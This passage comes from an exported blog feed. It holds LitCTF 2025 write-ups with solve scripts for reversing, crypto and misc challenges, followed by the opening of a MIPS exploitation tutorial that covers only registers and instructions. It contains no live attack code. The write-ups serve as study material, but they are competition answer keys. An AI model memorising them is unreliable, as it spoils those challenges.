ED 00 00 85 E3 00 00 8B D7 00 00 19 DE 00 00</span></span><br><span class="line"><span class="string">4C C9 00 00 14 AD 00 00 88 7E 00 00 B9 6B 00 00</span></span><br><span class="line"><span class="string">C6 4C 00 00 06 38 00 00 C9 2D 00 00 98 23 00 00</span></span><br><span class="line"><span class="string">E1 19 00 00</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.strip().split()</span><br><span class="line"></span><br><span class="line">cipher_bytes = <span class="built_in">bytes</span>([<span class="built_in">int</span>(b, <span class="number">16</span>) <span class="keyword">for</span> b <span class="keyword">in</span> hex_data])</span><br><span class="line">cipher = [struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, cipher_bytes[i:i+<span class="number">4</span>])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_bytes), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># key 解析</span></span><br><span class="line">key = <span class="string">&quot;LitCTF2025&quot;</span></span><br><span class="line">key_ints = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> key]</span><br><span class="line">key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算明文长度（基于 cipher 长度和 key 长度）</span></span><br><span class="line">plain_len = <span class="built_in">len</span>(cipher) - key_len + <span class="number">1</span></span><br><span class="line">plaintext = [<span class="number">0</span>] * plain_len</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密过程：从低到高逐个解</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(plain_len):</span><br><span class="line">    acc = cipher[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">min</span>(i + <span class="number">1</span>, key_len)):</span><br><span class="line">        acc -= plaintext[i - j] * key_ints[j]</span><br><span class="line">    plaintext[i] = acc // key_ints[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文结果:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> plaintext))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525200136373.png"
                      class=""
                >
<h3 id="re-easy_tea">re-easy_tea</h3>
<p>首先进IDA一看不能直接解析成函数，具有花指令，这里由于花指令数量不多，我就全部手动patch了。第一种是经典的jz和jnz组合，实际上就是直接跳转到指定的地址处，可以把jz，jnz以及跳转地址之前的内容全部nop掉。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525195356483.png"
                      class=""
                >
<p>第二种是call+ret的花指令，首先call进去把下一个指令的地址入栈，然后修改(+6)栈顶的这个返回地址，最后再返回回去，实际上就是直接执行call后面一个指令地址+6处的内容，前面的可以全部nop掉。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525195530658.png"
                      class=""
                >
<p>反复patch几个花指令之后，就可以直接在函数一开始yong快捷键p重新解析函数，然后就能f5直接看反汇编代码了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525195751389.png"
                      class=""
                >
<p>其中encrypt加密中具体实现的函数同样也有以上两种花指令，全部patch掉就行，然后可以看反汇编。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525195846438.png"
                      class=""
                >
<p>然后就可以直接写tea的解密脚本了：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">v, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    TEA-like decrypt function (based on the reversed encrypt logic)</span></span><br><span class="line"><span class="string">    v: list of 2 integers (v[0], v[1]) = 8-byte encrypted block</span></span><br><span class="line"><span class="string">    k: list of 4 integers = key</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    v0, v1 = v</span><br><span class="line">    delta = <span class="number">1131796</span></span><br><span class="line">    <span class="built_in">sum</span> = delta * <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (<span class="built_in">sum</span> + v0) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * v0)</span><br><span class="line">        v1 &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (<span class="built_in">sum</span> + v1) ^ (k[<span class="number">0</span>] + <span class="number">16</span> * v1)</span><br><span class="line">        v0 &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="built_in">sum</span> -= delta</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [v0, v1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_bytes_le</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 密文（解密目标）：v6</span></span><br><span class="line">    encrypted_data = [</span><br><span class="line">        -<span class="number">1753982978</span>,</span><br><span class="line">        -<span class="number">633464704</span>,</span><br><span class="line">        -<span class="number">1206480632</span>,</span><br><span class="line">        <span class="number">513091676</span>,</span><br><span class="line">        <span class="number">535291634</span>,</span><br><span class="line">        <span class="number">734395479</span>,</span><br><span class="line">        -<span class="number">1299247192</span>,</span><br><span class="line">        -<span class="number">1911683516</span>,</span><br><span class="line">        <span class="number">1749369893</span>,</span><br><span class="line">        -<span class="number">982040359</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先将负数转为无符号 32bit 表示</span></span><br><span class="line">    encrypted_data = [x &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> x <span class="keyword">in</span> encrypted_data]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密钥：v7</span></span><br><span class="line">    key = [</span><br><span class="line">        <span class="number">0x11223344</span>,</span><br><span class="line">        <span class="number">0x55667788</span>,</span><br><span class="line">        <span class="number">0x99aabbcc</span>,  </span><br><span class="line">        <span class="number">0xDDeeff11</span>   </span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密每个 8 字节块</span></span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_data), <span class="number">2</span>):</span><br><span class="line">        block = encrypted_data[i:i+<span class="number">2</span>]</span><br><span class="line">        decrypted = decrypt_block(block, key)</span><br><span class="line">        flag += int_to_bytes_le(decrypted[<span class="number">0</span>])</span><br><span class="line">        flag += int_to_bytes_le(decrypted[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除尾部 0（原始 flag 长度不一定是 40）</span></span><br><span class="line">    flag = flag.rstrip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode(errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525200115708.png"
                      class=""
                >
<h3 id="crypto-basic">crypto-basic</h3>
<p>签到题，n直接是一个素数，则其欧拉函数phi_n=n-1，然后就可以直接求出逆元，然后就是常规的rsa解密。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525200823885.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from enc import flag </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># m = bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># n = getPrime(1024)</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># c = pow(m,e,n)</span></span><br><span class="line"><span class="comment"># print(f&quot;n = &#123;n&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;e = &#123;e&#125;&quot;)</span></span><br><span class="line"><span class="comment"># print(f&quot;c = &#123;c&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">22100249806368901850308057097325161014161983862106732664802709096245890583327581696071722502983688651296445646479399181285406901089342035005663657920475988887735917901540796773387868189853248394801754486142362158369380296905537947192318600838652772655597241004568815762683630267295160272813021037399506007505</span></span><br><span class="line"></span><br><span class="line">phi_n = n - <span class="number">1</span></span><br><span class="line">d = mod_inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525201138005.png"
                      class=""
                >
<h3 id="crypto-ez_math">crypto-ez_math</h3>
<p>题目是一个RSA加密问题</p>
<p>先生成两个1024位素数p，q，计算n=p*q，生成素数noise，计算hint =
p*q+noise*p+noise*q+noise*noise=(p+noise)(q+noise)，明文flag通过RSA加密得到密文c=m^e
mod n，e=65537。</p>
<p>题目中使用了 2x2 矩阵 A 在有限域 GF (p) 上进行幂运算，得到矩阵 B =
A^e</p>
<p>我们需要计算 B 的 e 次根，即找到矩阵 A，使得 A^e ≡ B mod p</p>
<p>首先计算模逆元</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525212247923.png"
                      class=""
                >
<p>d = mod_inverse(e, p-1)</p>
<p>然后计算矩阵快速幂计算 A = B^d mod p</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525212315662.png"
                      class=""
                >
<p>A = matrix_pow_mod(B, d, p)</p>
<p>从矩阵中提取flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525212333830.png"
                      class=""
                >
<p>检查是否包含flag前缀</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525212348915.png"
                      class=""
                >
<p>完整代码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525212411501.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525212442034.png"
                      class=""
                >
<p>代码运行结果，输出flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525212456913.png"
                      class=""
                >
<h3 id="misc-cropping">misc-Cropping</h3>
<p>附件是一个加密过后的压缩包，直接用ZipCenOp.jar来尝试解除伪加密，发现可以直接解开。然后看到里面的压缩包中有大量编号规律的图片，右边预览可以看到很像是二维码碎片。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525200411745.png"
                      class=""
                >
<p>那么我们可以直接python脚本把图片根据顺序拼起来，然后就能得到二维码，扫码得到flag。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置区域</span></span><br><span class="line">grid_size = <span class="number">10</span></span><br><span class="line">swap_xy = <span class="literal">False</span>  <span class="comment"># 如果你发现拼出来是转置的，改成 True 或 False 试试</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载一张样例图判断 tile 尺寸</span></span><br><span class="line">sample_tile = Image.<span class="built_in">open</span>(<span class="string">&quot;tile_0_0.png&quot;</span>)</span><br><span class="line">tile_width, tile_height = sample_tile.size</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空白大图</span></span><br><span class="line">output_image = Image.new(<span class="string">&quot;RGB&quot;</span>, (tile_width * grid_size, tile_height * grid_size))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 贴图循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(grid_size):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(grid_size):</span><br><span class="line">        x, y = (j, i) <span class="keyword">if</span> swap_xy <span class="keyword">else</span> (i, j)</span><br><span class="line">        filename = <span class="string">f&quot;tile_<span class="subst">&#123;x&#125;</span>_<span class="subst">&#123;y&#125;</span>.png&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 缺失文件：<span class="subst">&#123;filename&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        tile = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">        output_image.paste(tile, (j * tile_width, i * tile_height))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存结果</span></span><br><span class="line">output_image.save(<span class="string">&quot;reconstructed_qr.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;拼接完成，已保存为 reconstructed_qr.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525200544796.png"
                      class=""
                >
<h3 id="misc-灵感菇">misc-灵感菇</h3>
<p>前端注释里有github网址</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525212857608.png"
                      class=""
                >
<p>直接拉取仓库，看readme里的usage，用法是python main.py -d
"cipher"。点击页面的按钮可以得到灵感菇编码的内容，用脚本解码即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525213056420.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525213315971.png"
                      class=""
                >
<h3 id="misc-问卷">misc-问卷</h3>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/26/litctf2025-writeup/image-20250525200700634.png"
                      class=""
                >
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>mips_pwn</title>
    <url>/blog/2024/09/21/mips-pwn/</url>
    <content><![CDATA[<h4 id="一mips架构概述">一、mips架构概述</h4>
<h5 id="寄存器">1.寄存器</h5>
<table>
<colgroup>
<col style="width: 9%" />
<col style="width: 10%" />
<col style="width: 80%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">寄存器</th>
<th>别名</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">$0</td>
<td>$zero</td>
<td>常量0</td>
</tr>
<tr>
<td style="text-align: left;">$1</td>
<td>$at</td>
<td>保留给汇编器（Assembler
Temporary）。在汇编过程中用于一些临时计算，程序员不应直接使用。</td>
</tr>
<tr>
<td style="text-align: left;">$2-$3</td>
<td><span class="math inline">\(v0-\)</span>v1</td>
<td>用于存储函数的返回值。</td>
</tr>
<tr>
<td style="text-align: left;">$4-$7</td>
<td><span class="math inline">\(a0-\)</span>a3</td>
<td>函数调用参数，用于传递最多 4 个函数参数。</td>
</tr>
<tr>
<td style="text-align: left;">$8-$15</td>
<td><span class="math inline">\(t0-\)</span>t7</td>
<td>临时寄存器。用于函数内部的临时计算，不需要保存其值。</td>
</tr>
<tr>
<td style="text-align: left;">$16-$23</td>
<td><span class="math inline">\(s0-\)</span>s7</td>
<td>保存寄存器。用于保存函数调用期间的值，调用函数时需要保留的值。</td>
</tr>
<tr>
<td style="text-align: left;">$24-$25</td>
<td><span class="math inline">\(t8-\)</span>t9</td>
<td>临时寄存器。与 <code>$t0-$t7</code>
类似，但通常不需要在函数调用中保存其值。</td>
</tr>
<tr>
<td style="text-align: left;">$26-$27</td>
<td><span class="math inline">\(k0-\)</span>k1</td>
<td>保留给操作系统内核。通常用于内核中进行系统调用或中断处理。</td>
</tr>
<tr>
<td style="text-align: left;">$28</td>
<td>$gp</td>
<td>全局指针。指向全局数据区域的基地址，便于访问全局变量。</td>
</tr>
<tr>
<td style="text-align: left;">$29</td>
<td>$sp</td>
<td>堆栈指针。指向当前堆栈的顶部，用于管理函数调用和局部变量。</td>
</tr>
<tr>
<td style="text-align: left;">$30</td>
<td><span class="math inline">\(fp(\)</span>s8)</td>
<td>帧指针。指向当前栈帧的基地址，通常用于访问局部变量和参数。</td>
</tr>
<tr>
<td style="text-align: left;">$31</td>
<td>$ra</td>
<td>返回地址。用于存储函数调用的返回地址，在函数调用时保存，并在函数返回时使用。</td>
</tr>
<tr>
<td style="text-align: left;">PC</td>
<td>PC</td>
<td>保存当前正在执行的指令的地址，并在每次指令执行后自动递增，以指向下一条指令的地址。</td>
</tr>
</tbody>
</table>
<p>mips架构中的fp寄存器相当于rbp，pc寄存器相当于rip。</p>
<h5 id="特征">2.特征</h5>
<ul>
<li><p><strong>mips架构由于本身特性不支持nx，所以栈段具有执行权限</strong></p></li>
<li><p><strong>MIPS
处理器通常将指令缓存（I-cache）和数据缓存（D-cache）分开，这有助于提高访问效率和减少缓存冲突。</strong></p></li>
<li><p>所有 MIPS 指令都具有固定的 32
位长度，这使得指令解码更加简单和高效。</p></li>
<li><p>MIPS 默认使用大端字节序，即最显著字节存储在最低地址。虽然 MIPS
也支持小端字节序，但大端字节序是 MIPS 的传统配置。</p></li>
<li><p>三种主要指令格式：</p>
<ul>
<li><strong>R 型</strong>：用于寄存器间操作（算术、逻辑等），例如
<code>add</code>、<code>sub</code>。</li>
<li><strong>I 型</strong>：用于立即数操作、加载和存储、分支等，例如
<code>addi</code>、<code>lw</code>。</li>
<li><strong>J 型</strong>：用于跳转，例如
<code>j</code>、<code>jal</code>。</li>
</ul></li>
<li><p>流水线操作</p>
<p>MIPS架构采用了流水线技术来提高指令执行的效率。流水线允许处理器同时处理多条指令的不同部分，从而大幅提高吞吐量。</p>
<p>常见的MIPS芯片流水线操作分为五个阶段：</p>
<ul>
<li><strong>IF（Instruction
Fetch，指令提取）</strong>：从内存中提取指令。</li>
<li><strong>ID（Instruction
Decode，指令解码）</strong>：对提取的指令进行解码，确定需要执行的操作。</li>
<li><strong>EX（Execute，执行）</strong>：执行指令，包括算术运算、逻辑运算等。</li>
<li><strong>MEM（Memory
Access，存储器访问）</strong>：访问内存，读取或写入数据。</li>
<li><strong>WB（Write
Back，寄存器写回）</strong>：将执行结果写回寄存器。</li>
</ul>
<p>在理想情况下，流水线中的每个阶段都会同时进行，使得处理器可以每个时钟周期执行一条新指令。然而，由于某些指令的执行需要更多的时间，可能会导致流水线暂停（称为“流水线停顿”），从而影响性能。</p>
<p><strong>分支延迟槽</strong></p>
<p>MIPS架构有一个特殊的概念叫<strong>分支延迟槽</strong>。当程序遇到分支指令（如跳转指令）时，程序会跳转到新的地址去执行新指令。然而，由于流水线的设计，紧接在分支指令之后的指令已经在流水线中开始执行了。为了避免浪费，MIPS架构规定，<strong>分支后的第一条指令（即位于分支延迟槽中的指令）会在跳转之前执行</strong>。</p>
<p>这意味着，在编写MIPS汇编代码或分析MIPS的二进制文件时，需要特别注意分支延迟槽的存在。例如，在以下MIPS汇编代码中：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0007F944    move    $t9, $s0</span><br><span class="line">.text:0007F948    jalr    $t9              </span><br><span class="line">.text:0007F94C    move    $a0, $s1</span><br></pre></td></tr></table></figure></div>
<p>虽然<code>jalr</code>指令是一个跳转指令，但紧接在其后的<code>move $a0, $s1</code>指令会在跳转之前执行。</p>
<p>一般而言跳转指令的下一条指令会是nop，但这种行为在查找利用漏洞的gadgets以及构造payload时非常重要。</p></li>
</ul>
<h5 id="指令格式">3.指令格式</h5>
<blockquote>
<p>op:指令基本操作，称为操作码。 rs:第一个源操作数寄存器。
rt:第二个源操作数寄存器。 rd:存放操作结果的目的操作数。 shamt:位移量；
funct:函数，这个字段选择op操作的某个特定变体。</p>
</blockquote>
<p>32位长度分配如下</p>
<p><strong>R格式</strong></p>
<table>
<thead>
<tr>
<th>6</th>
<th>5</th>
<th>5</th>
<th>5</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody>
<tr>
<td>op</td>
<td>rs</td>
<td>rt</td>
<td>rd</td>
<td>shamt</td>
<td>funct</td>
</tr>
</tbody>
</table>
<p>用于寄存器间操作（算术、逻辑等），例如
<code>add</code>、<code>sub</code>。</p>
<p><strong>I格式</strong></p>
<table>
<thead>
<tr>
<th>6</th>
<th>5</th>
<th>5</th>
<th>16</th>
</tr>
</thead>
<tbody>
<tr>
<td>op</td>
<td>rs</td>
<td>rt</td>
<td>立即数操作</td>
</tr>
</tbody>
</table>
<p>用于立即数操作、加载和存储、分支等，例如
<code>addi</code>、<code>lw</code>。</p>
<p><strong>J格式</strong></p>
<table>
<thead>
<tr>
<th>6</th>
<th>26</th>
</tr>
</thead>
<tbody>
<tr>
<td>op</td>
<td>跳转地址</td>
</tr>
</tbody>
</table>
<p>用于跳转，例如 <code>j</code>、<code>jal</code>。</p>
<h5 id="常用指令">4.常用指令</h5>
<table>
<colgroup>
<col style="width: 7%" />
<col style="width: 15%" />
<col style="width: 16%" />
<col style="width: 15%" />
<col style="width: 45%" />
</colgroup>
<thead>
<tr>
<th><strong>指令</strong></th>
<th><strong>功能</strong></th>
<th><strong>语法</strong></th>
<th><strong>示例</strong></th>
<th><strong>解释</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><code>add</code></strong></td>
<td>加法（有符号）</td>
<td><code>add $rd, $rs, $rt</code></td>
<td><code>add $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值相加，结果存储在
<code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>addu</code></strong></td>
<td>加法（无符号）</td>
<td><code>addu $rd, $rs, $rt</code></td>
<td><code>addu $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code>
的值相加（无符号），结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>sub</code></strong></td>
<td>减法（有符号）</td>
<td><code>sub $rd, $rs, $rt</code></td>
<td><code>sub $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 的值减去 <code>$t2</code> 的值，结果存储在
<code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>subu</code></strong></td>
<td>减法（无符号）</td>
<td><code>subu $rd, $rs, $rt</code></td>
<td><code>subu $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 的值减去 <code>$t2</code>
的值（无符号），结果存储在 <code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>and</code></strong></td>
<td>按位与</td>
<td><code>and $rd, $rs, $rt</code></td>
<td><code>and $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与，结果存储在
<code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>or</code></strong></td>
<td>按位或</td>
<td><code>or $rd, $rs, $rt</code></td>
<td><code>or $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位或，结果存储在
<code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>xor</code></strong></td>
<td>按位异或</td>
<td><code>xor $rd, $rs, $rt</code></td>
<td><code>xor $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位异或，结果存储在
<code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>nor</code></strong></td>
<td>按位与非</td>
<td><code>nor $rd, $rs, $rt</code></td>
<td><code>nor $t0, $t1, $t2</code></td>
<td>将 <code>$t1</code> 和 <code>$t2</code> 的值按位与非，结果存储在
<code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>sll</code></strong></td>
<td>左移</td>
<td><code>sll $rd, $rt, shamt</code></td>
<td><code>sll $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值左移 2 位，结果存储在 <code>$t0</code>
中。</td>
</tr>
<tr>
<td><strong><code>srl</code></strong></td>
<td>逻辑右移</td>
<td><code>srl $rd, $rt, shamt</code></td>
<td><code>srl $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值右移 2 位，结果存储在 <code>$t0</code>
中。</td>
</tr>
<tr>
<td><strong><code>sra</code></strong></td>
<td>算术右移</td>
<td><code>sra $rd, $rt, shamt</code></td>
<td><code>sra $t0, $t1, 2</code></td>
<td>将 <code>$t1</code> 的值算术右移 2 位，结果存储在 <code>$t0</code>
中</td>
</tr>
<tr>
<td><strong><code>lw</code></strong></td>
<td>加载字（32 位）</td>
<td><code>lw $rt, offset($rs)</code></td>
<td><code>lw $t0, 4($a0)</code></td>
<td>从地址 <code>$a0 + 4</code> 处加载 4 字节数据到
<code>$t0</code>。</td>
</tr>
<tr>
<td><strong><code>sw</code></strong></td>
<td>存储字（32 位）</td>
<td><code>sw $rt, offset($rs)</code></td>
<td><code>sw $t0, 4($a0)</code></td>
<td>将 <code>$t0</code> 中的数据存储到地址 <code>$a0 + 4</code>
处。</td>
</tr>
<tr>
<td><strong><code>lb</code></strong></td>
<td>加载字节（8 位）</td>
<td><code>lb $rt, offset($rs)</code></td>
<td><code>lb $t0, 0($a0)</code></td>
<td>从地址 <code>$a0</code> 处加载 1 字节数据到 <code>$t0</code>。</td>
</tr>
<tr>
<td><strong><code>sb</code></strong></td>
<td>存储字节（8 位）</td>
<td><code>sb $rt, offset($rs)</code></td>
<td><code>sb $t0, 0($a0)</code></td>
<td>将 <code>$t0</code> 中的 1 字节数据存储到地址 <code>$a0</code>
处。</td>
</tr>
<tr>
<td><strong><code>lui</code></strong></td>
<td>加载上半字（立即数）</td>
<td><code>lui $rt, imm</code></td>
<td><code>lui $t0, 0x1234</code></td>
<td>将立即数 <code>0x1234</code> 加载到 <code>$t0</code> 的高 16 位（低
16 位为 0）。</td>
</tr>
<tr>
<td><strong><code>ori</code></strong></td>
<td>立即数按位或</td>
<td><code>ori $rt, $rs, imm</code></td>
<td><code>ori $t0, $t1, 0xFF</code></td>
<td>将 <code>$t1</code> 和立即数 <code>0xFF</code> 按位或，结果存储在
<code>$t0</code> 中。</td>
</tr>
<tr>
<td><strong><code>beq</code></strong></td>
<td>等于分支</td>
<td><code>beq $rs, $rt, offset</code></td>
<td><code>beq $t0, $t1, label</code></td>
<td>如果 <code>$t0</code> 等于 <code>$t1</code>，则跳转到
<code>label</code>。</td>
</tr>
<tr>
<td><strong><code>bne</code></strong></td>
<td>不等于分支</td>
<td><code>bne $rs, $rt, offset</code></td>
<td><code>bne $t0, $t1, label</code></td>
<td>如果 <code>$t0</code> 不等于 <code>$t1</code>，则跳转到
<code>label</code>。</td>
</tr>
<tr>
<td><strong><code>j</code></strong></td>
<td>无条件跳转</td>
<td><code>j target</code></td>
<td><code>j label</code></td>
<td>跳转到 <code>label</code> 处。</td>
</tr>
<tr>
<td><strong><code>jal</code></strong></td>
<td>跳转并链接</td>
<td><code>jal target</code></td>
<td><code>jal subroutine</code></td>
<td>跳转到 <code>subroutine</code>，并将返回地址存储在 <code>$ra</code>
寄存器中。</td>
</tr>
<tr>
<td><strong><code>jr</code></strong></td>
<td>跳转寄存器</td>
<td><code>jr $rs</code></td>
<td><code>jr $ra</code></td>
<td>跳转到 <code>$ra</code> 寄存器中存储的地址。</td>
</tr>
<tr>
<td><strong><code>nop</code></strong></td>
<td>空操作</td>
<td><code>nop</code></td>
<td><code>nop</code></td>
<td>什么也不做，通常用于填充延迟槽。</td>
</tr>
</tbody>
</table>
